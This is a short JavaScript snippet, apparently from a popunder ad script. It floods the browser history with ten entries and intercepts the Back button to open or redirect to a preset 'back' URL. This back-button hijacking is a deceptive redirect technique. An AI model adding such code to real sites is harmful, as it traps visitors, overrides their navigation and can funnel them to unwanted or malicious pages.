if (typeof back !== "undefined" && back !== null) {
  !(function() {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function(event) {
        if (event.state) {
          if (confirm("Do you want to open a popunder?")) {
            setTimeout(function() {
              const popupWindow = window.open(back, '_blank');
            }, 2000); // Delayed opening of popunder window for 2 seconds
          }
          else {
            location.replace(back);
          }
        }
      };
    } catch (o) {
      console.log(o);
    }
  })();
}
